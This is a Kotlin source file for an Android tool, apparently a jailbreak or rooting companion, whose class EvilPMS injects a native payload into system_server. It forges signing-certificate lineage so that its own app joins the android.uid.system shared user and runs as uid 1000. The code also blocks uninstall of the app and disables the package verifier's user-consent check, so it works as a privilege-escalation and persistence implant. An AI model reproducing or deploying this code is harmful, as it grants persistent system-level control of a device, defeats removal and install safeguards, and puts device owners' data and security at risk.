package jb.companion

import android.annotation.SuppressLint
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.os.Process
import android.provider.Settings
import android.util.Log

internal const val TAG = "JBCompanion"

@SuppressLint("PrivateApi", "MissingPermission", "RequestInstallPackagesPolicy")
class EvilPMS {

    companion object {
        const val SYSTEM_APK = "/data/system/jb.companion_system.apk"
        const val PAYLOAD_APK = "/data/system/jb.companion_payload.apk"
        const val PKG = "jb.companion"

        @JvmStatic
        fun main(args: Array<String>) {
            val ctx = Class.forName("android.app.ActivityThread")
                .getMethod("currentApplication").invoke(null) as Context
            EvilPMS().doInject(PKG, ctx)
        }
    }

    private val pm by lazy { RPMS() }

    private fun getSignatureFingerprint(sig: Any): String {
        val bytes = pm.getSignatureBytes(sig) ?: return "[no bytes]"
        return java.security.MessageDigest.getInstance("SHA-256").digest(bytes)
            .joinToString(":") { "%02x".format(it) }
    }

    fun inject(context: Context, emit: (String) -> Unit) {
        val libDir = context.applicationInfo.nativeLibraryDir
        val packageName = context.packageName

        val payloadSrc = Utils.sh("pm path $packageName").trim().removePrefix("package:").trim()
        Utils.sh("cp $payloadSrc $PAYLOAD_APK && chown system:system $PAYLOAD_APK")
        emit("[*] staged payload APK to $PAYLOAD_APK")

        val systemSrc = java.io.File(context.cacheDir, "system.apk")
        context.assets.open("system.apk").use { it.copyTo(java.io.FileOutputStream(systemSrc)) }
        Utils.sh("cp ${systemSrc.absolutePath} $SYSTEM_APK && chown system:system $SYSTEM_APK")
        emit("[*] staged system APK to $SYSTEM_APK")

        val pid = Utils.sh("pidof system_server").trim()
        if (pid.isEmpty()) {
            emit("[x] system_server not found")
            return
        }
        emit("[*] system_server pid=$pid")

        val out = Utils.sh("$libDir/libinject.so $pid $libDir/libpayload.so entry")
        if (out.isNotEmpty()) emit(out)
        emit("[*] inject command returned")
    }

    fun uninstall(context: Context) {
        pm.setBlockUninstallLPw(0, PKG, false)
        pm.setPastSigningCertificates(pm.getSigningDetails(pm.getSharedUserLPw("android.uid.system")), null)
        Utils.uninstall(context, PKG)
    }

    fun dumpSharedUID(emit: (String) -> Unit = { Log.e(TAG, it) }) {
        runCatching {
            val sysUser = pm.getSharedUserLPw("android.uid.system")
            val sysSd = pm.getSigningDetails(sysUser)

            emit("")
            emit("android.uid.system certificates")
            emit("================================")
            val pastCerts = pm.getPastSigningCertificates(sysSd)
            if (pastCerts.isEmpty()) emit("(none)") else pastCerts.forEach { emit(getSignatureFingerprint(it)) }

            emit("")
            emit("User Apps with sharedUserId")
            emit("===========================")
            val packages = pm.getSharedUserPackages(sysUser)
            if (packages.isEmpty()) {
                emit("(none)")
            } else {
                for (name in packages) {
                    val fp = runCatching {
                        getSignatureFingerprint(pm.getSignatures(pm.getSigningDetails(pm.getPackageLPr(name))).first())
                    }.getOrElse { "[error: ${it.message}]" }
                    emit(name)
                    emit(fp)
                }
            }
        }.onFailure { emit("[!] dumpSharedUID failed: $it") }
    }

    private fun injectIntoSharedUser(sharedUserName: String, packageName: String) {
        val sysSigns = pm.getSigningDetails(pm.getSharedUserLPw(sharedUserName))
        val ourCert = pm.getSignatures(pm.getSigningDetails(pm.getPackageLPr(packageName))).first()
        pm.setSignatureFlags(ourCert, 2 /* CertCapabilities.SHARED_USER_ID */)
        pm.setPastSigningCertificates(sysSigns, pm.createPastSigningCertsArray(ourCert))
        Log.e(TAG, "[+] Injection successful")
        pm.writeSettings()
        Log.e(TAG, "[+] Persistence successful, reinstalling...")
    }

    private fun doInject(packageName: String, context: Context) {
        try {
            val currentUid = runCatching {
                context.packageManager.getPackageInfo(packageName, 0).applicationInfo?.uid
            }.getOrNull()
            if (currentUid == Process.SYSTEM_UID) {
                Log.e(TAG, "[~] Already persisted as uid=1000, skipping re-injection")
                return
            }

            if (java.io.File(SYSTEM_APK).exists()) {
                Log.e(TAG, "[+] Found system APK at $SYSTEM_APK, attempting persistence...")

                injectIntoSharedUser("android.uid.system", packageName)
                pm.setBlockUninstallLPw(0, packageName, false)
                reinstall(packageName, context)

                for (i in 1..10) {
                    Thread.sleep(1000)
                    try {
                        val info = context.packageManager.getPackageInfo(packageName, 0)
                        val uid = info.applicationInfo?.uid ?: -1
                        Log.e(TAG, "[~] Post-reinstall uid check ($i/10): uid=$uid")
                        if (uid == Process.SYSTEM_UID) {
                            Log.e(TAG, "[+] uid=1000 confirmed, blocking uninstall")
                            pm.setBlockUninstallLPw(0, packageName, true)
                            context.startActivity(
                                Intent().setClassName(packageName, "$packageName.MainActivity")
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            )
                            break
                        }
                    } catch (_: android.content.pm.PackageManager.NameNotFoundException) {
                        Log.e(TAG, "[-] Package not found yet ($i/10), still installing...")
                    } catch (_: ActivityNotFoundException) {
                        Log.e(TAG, "[-] Activity not ready ($i/10)...")
                    }
                }
            } else {
                Log.e(TAG, "[x] System APK not found at $SYSTEM_APK")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[x] Unexpected error in persistence stage: ", e)
        }
    }

    private fun reinstall(packageName: String, context: Context) {
        Settings.Global.putInt(context.contentResolver, "package_verifier_user_consent", -1)
        Utils.uninstall(context, packageName)
        Thread.sleep(1000)
        Utils.install(context, java.io.File(SYSTEM_APK))
    }
}
